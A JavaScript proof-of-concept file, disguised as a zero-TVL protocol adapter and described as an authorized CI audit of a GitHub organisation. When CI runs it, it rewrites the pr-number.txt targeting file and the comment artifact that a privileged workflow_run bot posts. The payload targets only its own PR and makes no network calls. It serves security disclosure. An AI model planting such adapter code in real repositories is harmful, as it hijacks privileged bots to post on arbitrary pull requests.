// i5163 - authorized red-team PoC (dhedge GitHub org CI audit, task 18).
// Demonstrates that untrusted PR adapter code executes inside Test_Change AFTER
// pr-comments/pr-number.txt is written and BEFORE the pr-comments artifact upload,
// giving full control over the artifact content (and targeting file) that the
// privileged Comment_PR workflow_run bot posts with pull-requests: write.
// SELF-TARGETING ONLY: rewrites pr-number.txt with the SAME number the workflow
// wrote (this PR). No other issue/PR is touched. No network calls, no data access.
const fs = require('fs');
const path = require('path');

try {
  const dir = path.join(process.cwd(), 'pr-comments');
  if (fs.existsSync(dir)) {
    const numFile = path.join(dir, 'pr-number.txt');
    const n = fs.readFileSync(numFile, 'utf8').trim();
    // Prove attacker write access to the bot's targeting file (same value, self-target).
    fs.writeFileSync(numFile, n + '\n');
    fs.writeFileSync(
      path.join(dir, '01-adapter-write.md'),
      [
        '### i5163 PoC - adapter-controlled comment body (authorized test)',
        '',
        'This comment was posted by the privileged `Comment_PR` bot (`workflow_run`, `pull-requests: write`),',
        'but its body was written by **untrusted adapter code from this fork PR** executed by `test.yml`.',
        'The adapter also rewrote `pr-comments/pr-number.txt` (the bot\'s targeting file) - here with the',
        'same self-target number #' + n + '; any integer would be accepted (`Number.isInteger` check only).',
        '',
        'Generated: ' + new Date().toISOString(),
      ].join('\n')
    );
  }
} catch (e) {
  console.log('[i5163-poc] write error:', e.message);
}

module.exports = {
  timetravel: false,
  methodology: 'Authorized security PoC adapter (i5163). Reports zero TVL; makes no network calls.',
  optimism: {
    tvl: async () => 0,
  },
};